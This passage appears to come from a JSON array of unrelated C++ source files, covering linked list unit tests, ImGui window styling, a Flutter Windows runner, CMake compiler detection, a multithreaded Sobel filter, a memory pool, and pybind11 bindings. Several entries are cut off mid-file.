node.data);\n\t\t\tnode.insertAfter(6);\n\t\t\tAssert::IsNotNull(node.next);\n\t\t\tAssert::AreEqual(6, node.next->data);\n\t\t\tAssert::AreSame(node, *(node.next->previous));\n\t\t}\n\t\t/*\n\t\t\tTest insert after correctly inserts a value between 2 existing nodes\n\t\t\tinitial list: {5, 7}\n\t\t\tfinal list : {5,6,7}\n\n\t\t\ttest checks teh values are in the correct place and next/previous \n\t\t\tare pointing correctly in the new node\n\t\t*/\n\t\tTEST_METHOD(TestInsertAfterBetweenTwoNodes)\n\t\t{\n\t\t\tDListNode<int> node(5); // add 5\n\t\t\tnode.insertAfter(7);// add 7 next\n\t\t\tDListNode<int> *finalNode = node.next;\n\t\t\tnode.insertAfter(6);// place 6 between 5 and 7\n\t\t\tDListNode<int> *next = node.next;\n\t\t\tAssert::IsNotNull(next);\n\t\t\tAssert::AreEqual(6, next->data);\n\t\t\tAssert::AreSame(node, *next->previous);\n\t\t\tAssert::AreSame(*finalNode, *next->next);\n\t\t\tAssert::AreSame(*finalNode->previous, *next);\n\t\t\tAssert::AreSame(*(node.next), *next);\n\n\t\t}\n\n\t\t/*\n\t\tTest of insert before with a single node\n\t\tTests teh correct value is set and the correct links are established\n\t\tusing next and previous\n\n\t\t*/\n\t\tTEST_METHOD(TestInsertBefore)\n\t\t{\n\t\t\tDListNode<int> node(5);\n\t\t\tAssert::AreEqual(5, node.data);\n\t\t\tnode.insertBefore(4);\n\t\t\tAssert::IsNotNull(node.previous);\n\t\t\tAssert::AreEqual(4, node.previous->data);\n\t\t\tAssert::AreSame(node, *(node.previous->next));\n\t\t}\n\t\t/*\n\t\tTest insert before correctly inserts a value between 2 existing nodes\n\t\tinitial list: {5, 7}\n\t\tfinal list : {5,6,7}\n\n\t\ttest checks the values are in the correct place and next/previous\n\t\tare pointing correctly in the new node\n\t\t*/\n\t\tTEST_METHOD(TestInsertBeforeBetweenTwoNodes)\n\t\t{\n\t\t\tDListNode<int> node(5); // add 5\n\t\t\tnode.insertAfter(7);// add 7 next\n\t\t\tDListNode<int> *finalNode = node.next;\n\t\t\tfinalNode->insertBefore(6);// place 6 between 5 and 7\n\t\t\tDListNode<int> *next = node.next;\n\t\t\tAssert::IsNotNull(next);\n\t\t\tAssert::AreEqual(6, next->data);\n\t\t\tAssert::AreSame(node, *next->previous);\n\t\t\tAssert::AreSame(*finalNode, *next->next);\n\t\t\tAssert::AreSame(*finalNode->previous, *next);\n\t\t\tAssert::AreSame(*(node.next), *next);\n\n\t\t}\n\t};\n}",
    "#include \"main.h\"\n\nvoid custom::style() {\n\tauto& style = ImGui::GetStyle();\n\n\tstyle.WindowRounding = 10.f;\n\tstyle.WindowPadding = ImVec2(0, 0);\n\tstyle.WindowBorderSize = 0.f;\n}\n\nvoid custom::move_window() {\n\tRECT rc;\n\n\tGetWindowRect(hwnd, &rc);\n\tMoveWindow(hwnd, rc.left + ImGui::GetWindowPos().x, rc.top + ImGui::GetWindowPos().y, window::size.x, window::size.y, TRUE);\n\tImGui::SetWindowPos({ 0, 0 });\n}\n\nvoid custom::set_blur(HWND hwnd) {\n\tstruct ACCENTPOLICY\n\t{\n\t\tint na;\n\t\tint nf;\n\t\tint nc;\n\t\tint nA;\n\t};\n\tstruct WINCOMPATTRDATA\n\t{\n\t\tint na;\n\t\tPVOID pd;\n\t\tULONG ul;\n\t};\n\n\tconst HINSTANCE hm = LoadLibrary(L\"user32.dll\");\n\tif (hm)\n\t{\n\t\ttypedef BOOL(WINAPI* pSetWindowCompositionAttribute)(HWND, WINCOMPATTRDATA*);\n\n\t\tconst pSetWindowCompositionAttribute SetWindowCompositionAttribute = (pSetWindowCompositionAttribute)GetProcAddress(hm, \"SetWindowCompositionAttribute\");\n\t\tif (SetWindowCompositionAttribute)\n\t\t{\n\t\t\tACCENTPOLICY policy = { 3, 0, 0, 0 }; // 4,0,155,0 (Acrylic blur) 3,0,0,0 \n\t\t\tWINCOMPATTRDATA data = { 19, &policy,sizeof(ACCENTPOLICY) };\n\t\t\tSetWindowCompositionAttribute(hwnd, &data);\n\t\t}\n\t\tFreeLibrary(hm);\n\t}\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"minimalist_state_timer_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "\ufeff// HomeWorking.cpp : \u042d\u0442\u043e\u0442 \u0444\u0430\u0439\u043b \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0444\u0443\u043d\u043a\u0446\u0438\u044e \"main\". \u0417\u0434\u0435\u0441\u044c \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0438 \u0437\u0430\u043a\u0430\u043d\u0447\u0438\u0432\u0430\u0435\u0442\u0441\u044f \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n//\n\n#include <iostream>\n#include <Windows.h>\n#include <string>\n\nint main()\n{\n    setlocale(LC_ALL, \"rus\");\n    SetConsoleOutputCP(1251);\n    SetConsoleCP(1251);\n    std::cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u043b\u043e\u0432\u043e:\\n\";\n    std::string stringAnswer{};\n    std::getline(std::cin >> std::ws, stringAnswer);\n    std::cout << \"\u0412\u044b \u0432\u0432\u0435\u043b\u0438:\\n\";\n    std::cout << stringAnswer << std::endl;\n}\n\n// \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: CTRL+F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u043a \u0431\u0435\u0437 \u043e\u0442\u043b\u0430\u0434\u043a\u0438\"\n// \u041e\u0442\u043b\u0430\u0434\u043a\u0430 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b: F5 \u0438\u043b\u0438 \u043c\u0435\u043d\u044e \"\u041e\u0442\u043b\u0430\u0434\u043a\u0430\" > \"\u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c \u043e\u0442\u043b\u0430\u0434\u043a\u0443\"\n\n// \u0421\u043e\u0432\u0435\u0442\u044b \u043f\u043e \u043d\u0430\u0447\u0430\u043b\u0443 \u0440\u0430\u0431\u043e\u0442\u044b \n//   1. \u0412 \u043e\u043a\u043d\u0435 \u043e\u0431\u043e\u0437\u0440\u0435\u0432\u0430\u0442\u0435\u043b\u044f \u0440\u0435\u0448\u0435\u043d\u0438\u0439 \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u0438 \u0443\u043f\u0440\u0430\u0432\u043b\u044f\u0442\u044c \u0438\u043c\u0438.\n//   2. \u0412 \u043e\u043a\u043d\u0435 Team Explorer \u043c\u043e\u0436\u043d\u043e \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0438\u0442\u044c\u0441\u044f \u043a \u0441\u0438\u0441\u0442\u0435\u043c\u0435 \u0443\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438.\n//   3. \u0412 \u043e\u043a\u043d\u0435 \"\u0412\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u0432\u044b\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0441\u0431\u043e\u0440\u043a\u0438 \u0438 \u0434\u0440\u0443\u0433\u0438\u0435 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f.\n//   4. \u0412 \u043e\u043a\u043d\u0435 \"\u0421\u043f\u0438\u0441\u043e\u043a \u043e\u0448\u0438\u0431\u043e\u043a\" \u043c\u043e\u0436\u043d\u043e \u043f\u0440\u043e\u0441\u043c\u0430\u0442\u0440\u0438\u0432\u0430\u0442\u044c \u043e\u0448\u0438\u0431\u043a\u0438.\n//   5. \u041f\u043e\u0441\u043b\u0435\u0434\u043e\u0432\u0430\u0442\u0435\u043b\u044c\u043d\u043e \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0441\u043e\u0437\u0434\u0430\u0442\u044c \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430, \u0438\u043b\u0438 \"\u041f\u0440\u043e\u0435\u043a\u0442\" > \"\u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\", \u0447\u0442\u043e\u0431\u044b \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u0432 \u043f\u0440\u043e\u0435\u043a\u0442 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u044e\u0449\u0438\u0435 \u0444\u0430\u0439\u043b\u044b \u043a\u043e\u0434\u0430.\n//   6. \u0427\u0442\u043e\u0431\u044b \u0441\u043d\u043e\u0432\u0430 \u043e\u0442\u043a\u0440\u044b\u0442\u044c \u044d\u0442\u043e\u0442 \u043f\u0440\u043e\u0435\u043a\u0442 \u043f\u043e\u0437\u0436\u0435, \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442\u044b \u043c\u0435\u043d\u044e \"\u0424\u0430\u0439\u043b\" > \"\u041e\u0442\u043a\u0440\u044b\u0442\u044c\" > \"\u041f\u0440\u043e\u0435\u043a\u0442\" \u0438 \u0432\u044b\u0431\u0435\u0440\u0438\u0442\u0435 SLN-\u0444\u0430\u0439\u043b.\n",
    "#include <opencv2/opencv.hpp>\n#include <iostream>\n#include <pthread.h>\n#include <cmath>\n#include <chrono>\n\nusing namespace std;\nusing namespace std::chrono;\nusing namespace cv;\n\n// \u0421\u043e\u0431\u0435\u043b\u044c X \u0438 Y \u044f\u0434\u0440\u0430\nconst int kernelX[3][3] = {\n    {-1, 0, 1},\n    {-2, 0, 2},\n    {-1, 0, 1}\n};\n\nconst int kernelY[3][3] = {\n    {1, 2, 1},\n    {0, 0, 0},\n    {-1, -2, -1}\n};\n\n// \u0418\u0441\u0445\u043e\u0434\u043d\u043e\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0438 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\nMat image;\nMat result;\n\n// \u0421\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u0434\u0430\u043d\u043d\u044b\u0445 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0434\u0430\u0447\u0438 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432 \u0432 \u043f\u043e\u0442\u043e\u043a\u0438\nstruct ThreadData {\n    int startRow;\n    int endRow;\n};\n\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0440\u0438\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0444\u0438\u043b\u044c\u0442\u0440\u0430 \u0421\u043e\u0431\u0435\u043b\u0430 \u043a \u0447\u0430\u0441\u0442\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nvoid* applySobelFilter(void* arg) {\n    ThreadData* data = (ThreadData*)arg;\n    int gx, gy;\n\n    for (int i = data->startRow; i < data->endRow; ++i) {\n        for (int j = 0; j < image.cols; ++j) {\n            gx = gy = 0;\n            // Apply Sobel kernels, with boundary checks\n            for (int k = -1; k <= 1; ++k) {\n                for (int l = -1; l <= 1; ++l) {\n                    int row = i + k;\n                    int col = j + l;\n                    // Check boundaries\n                    if (row >= 0 && row < image.rows && col >= 0 && col < image.cols) {\n                        int pixel = image.at<uchar>(row, col);\n                        gx += pixel * kernelX[k + 1][l + 1];\n                        gy += pixel * kernelY[k + 1][l + 1];\n                    }\n                }\n            }\n            int magnitude = sqrt(gx * gx + gy * gy);\n            result.at<uchar>(i, j) = saturate_cast<uchar>(magnitude);\n        }\n    }\n    return nullptr;\n}\n\nint main() {\n    // \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u0433\u0440\u0430\u0434\u0430\u0446\u0438\u044f\u0445 \u0441\u0435\u0440\u043e\u0433\u043e\n    string imagePath = \"/Users/jora/Desktop/\u043c\u0430\u0438/5 \u0441\u0435\u043c/\u041e\u0421/\u041b\u04204/cheshire_cat.jpg\";  // \u0423\u043a\u0430\u0436\u0438 \u043f\u0443\u0442\u044c \u043a \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044e\n    image = imread(imagePath, IMREAD_GRAYSCALE);\n\n    if (image.empty()) {\n        cerr << \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f!\" << endl;\n        return -1;\n    }\n\n    // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043c\u0430\u0442\u0440\u0438\u0446\u0443 \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430\n    result = Mat::zeros(image.rows, image.cols, image.type());\n\n    // \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u043e\u0442\u043e\u043a\u043e\u0432 \u0434\u043b\u044f \u0442\u0435\u0441\u0442\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n    vector<int> threadCounts = {1, 2, 4, 8, 16, 32};\n\n    for (int threadCount : threadCounts) {\n        // \u041d\u0430\u0447\u0430\u043b\u043e \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f \u0432\u0440\u0435\u043c\u0435\u043d\u0438\n        auto start = high_resolution_clock::now();\n\n        pthread_t threads[threadCount];\n        ThreadData threadData[threadCount];\n\n        int rowsPerThread = image.rows / threadCount;\n\n        // \u0421\u043e\u0437\u0434\u0430\u0435\u043c \u043f\u043e\u0442\u043e\u043a\u0438\n        for (int i = 0; i < threadCount; ++i) {\n            threadData[i].startRow = i * rowsPerThread;\n            threadData[i].endRow = (i == threadCount - 1) ? image.rows : (i + 1) * rowsPerThread;\n            pthread_create(&threads[i], nullptr, applySobelFilter, &threadData[i]);\n        }\n\n        // \u0416\u0434\u0435\u043c \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u044f \u0432\u0441\u0435\u0445 \u043f\u043e\u0442\u043e\u043a\u043e\u0432\n        for (int i = 0; i < threadCount; ++i) {\n            pthread_join(threads[i], nullptr);\n        }\n\n        // \u041a\u043e\u043d\u0435\u0446 \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f \u0432\u0440\u0435\u043c\u0435\u043d\u0438\n        auto end = high_resolution_clock::now();\n        auto duration = duration_cast<milliseconds>(end - start).count();\n\n        cout << \"Threads: \" << threadCount << \", Time: \" << duration << \" ms\" << endl;\n    }\n\n    // \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430\n    imwrite(\"sobel_output.jpg\", result);\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <atomic> //sadly I had to include another library besides iostream :(\r\n#include <cstdint> // for uintptr_t and agian :(((((((((((\r\n#include <thread>\r\n\r\nstruct Block {\r\n    Block* next;\r\n};\r\n\r\nstruct Node {\r\n    int data;\r\n    Node* next; //The next member in a node holds the address of the next node in the linked list or nullptr if there are no further nodes.\r\n\r\n    Node(int value) : data(value), next(nullptr) {}\r\n};\r\n\r\nclass Spinlock {\r\nprivate:\r\n    std::atomic_flag lock = ATOMIC_FLAG_INIT;\r\n\r\npublic:\r\n    void lockPool() {\r\n        while (lock.test_and_set(std::memory_order_acquire)) {\r\n            std::this_thread::yield();\r\n        }\r\n    }\r\n\r\n    void unlockPool() {\r\n        lock.clear(std::memory_order_release);\r\n    }\r\n};\r\n\r\nvoid* alignPointer(void* ptr, size_t alignment) {\r\n    if (alignment == 0 || (alignment & (alignment - 1)) != 0) {\r\n        throw std::invalid_argument(\"Alignment must be a power of two\");\r\n    }\r\n\r\n    uintptr_t p = reinterpret_cast<uintptr_t>(ptr);\r\n    size_t misalignment = p % alignment;\r\n    size_t adjustment = (alignment - misalignment) % alignment;\r\n\r\n    uintptr_t aligned = p + adjustment;\r\n\r\n    return reinterpret_cast<void*>(aligned);\r\n}\r\n\r\nclass MemoryPool {\r\nprivate:\r\n    Spinlock spinlock;\r\n    Block* freeList; //pointer to the first available block\r\n    void* poolStart; // Pointer to the start of the entire memory pool\r\n    size_t blockSize;\r\n    size_t totalBlocks;\r\n    size_t usedBlocks; // Track the number of blocks currently in use\r\n    size_t alignment;\r\npublic:\r\n    MemoryPool(size_t blocksize, size_t totalBlocks, size_t alignment = alignof(std::max_align_t)) {\r\n        this->alignment = alignment;\r\n        initializeMemoryPool(blocksize, totalBlocks);\r\n    }\r\n\r\n    ~MemoryPool() {\r\n        destroyMemoryPool();\r\n    }\r\n\r\n    Block* allocateBlock() {\r\n        spinlock.lockPool();\r\n\r\n        if (!freeList) {\r\n            resizePool();\r\n        }\r\n\r\n        if (!freeList) {\r\n            spinlock.unlockPool();\r\n            return nullptr;\r\n        }\r\n\r\n        Block* allocateBlock = freeList;\r\n        freeList = freeList->next;\r\n        usedBlocks++;\r\n        spinlock.unlockPool();\r\n\r\n        return allocateBlock;\r\n    }\r\n\r\n    void deallocateBlock(Block* block) {\r\n        spinlock.lockPool();\r\n        block->next = freeList;\r\n        freeList = block;\r\n        spinlock.unlockPool();\r\n    }\r\n\r\n    void reset() {\r\n        freeList = static_cast<Block*>(poolStart);\r\n        usedBlocks = 0;\r\n    }\r\nprivate:\r\n    void initializeMemoryPool(size_t blockSize, size_t totalBlocks) {\r\n        this->blockSize = blockSize;\r\n        this->totalBlocks = totalBlocks;\r\n        this->alignment = alignment;\r\n\r\n        void* rawPool = operator new(blockSize * totalBlocks + alignment - 1);\r\n\r\n        this->poolStart = alignPointer(rawPool, alignment);\r\n\r\n        this->freeList = static_cast<Block*>(this->poolStart);\r\n\r\n        Block* currentBlock = this->freeList;\r\n\r\n        for (size_t i = 1; i < totalBlocks; i++) {\r\n            currentBlock->next = reinterpret_cast<Block*>(reinterpret_cast<char*>(currentBlock) + blockSize);\r\n            currentBlock = currentBlock->next;\r\n        }\r\n        currentBlock->next = nullptr;\r\n    } \r\n\r\n    void resizePool() {\r\n        size_t newSize = totalBlocks + (totalBlocks / 2);\r\n\r\n        void* newRawPool = operator new(blockSize * newSize + alignment - 1);\r\n        if (!newRawPool) {\r\n            throw std::runtime_error(\"Memory allocation failed during resize.\");\r\n        }\r\n        void* newPoolStart = alignPointer(newRawPool, alignment);\r\n\r\n        Block* newFreeList = static_cast<Block*>(newPoolStart);\r\n        Block* currentBlock = newFreeList;\r\n\r\n        for (size_t i = 1; i < newSize; i++) {\r\n            currentBlock->next = reinterpret_cast<Block*>(reinterpret_cast<char*>(currentBlock) + blockSize);\r\n            currentBlock = currentBlock->next;\r\n        }\r\n\r\n        currentBlock->next = nullptr;\r\n\r\n        currentBlock->next = freeList;\r\n        freeList = newFreeList;\r\n        totalBlocks = newSize;\r\n\r\n        std::cout << \"Memory pool resized. New size: \" << totalBlocks << \" blocks.\" << std::endl;\r\n    }\r\n\r\n    void destroyMemoryPool() {\r\n        operator delete(this->poolStart);\r\n        this->poolStart = nullptr;\r\n        this->freeList = nullptr;\r\n    }  \r\n};\r\n\r\nclass SingleLinkedList {\r\nprivate:\r\n    Spinlock spinlock;\r\n    Node* head; // Pointer to the head node\r\n    MemoryPool* pool;\r\npublic:\r\n    SingleLinkedList(MemoryPool* memoryPool) : head(nullptr), pool(memoryPool) {}\r\n\r\n    int getLength() {\r\n        int length = 0;\r\n        Node* current = head;\r\n\r\n        while (current != nullptr) {\r\n            length++;\r\n            current = current->next;\r\n        }\r\n        return length;\r\n    }\r\n\r\n    void insert(int value) {\r\n        Block* block = pool->allocateBlock();\r\n\r\n        if (!block) {\r\n            std::cout << \"Memory pool is full. Cannot allocate new node.\" << std::endl;\r\n            re",
    "#include <pybind11/pybind11.h>\n#include \"screamer/common/base.h\"\n#include \"screamer/common/transform.h\"\n#include \"screamer/transform_functions.h\"\n#include \"screamer/linear.h\"\n#include \"screamer/power.h\"\n\nnamespace py = pybind11;\n\nvoid init_bindings_math(py::module& m) {\n\n     py::class_<screamer::Transform<(double (*)(double)) std::abs>>(m, \"Abs\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::abs>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::abs>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::log>>(m, \"Log\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::log>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::log>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::exp>>(m, \"Exp\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double (*)(double)) std::exp>::operator(), py::arg(\"value\"))\n        .def(\"reset\", &screamer::Transform<(double (*)(double)) std::exp>::reset, \"Reset to the initial state.\");\n\n     py::class_<screamer::Transform<(double (*)(double)) std::sqrt>>(m, \"Sqrt\")\n        .def(py::init<>())\n        .def(\"__call__\", &screamer::Transform<(double 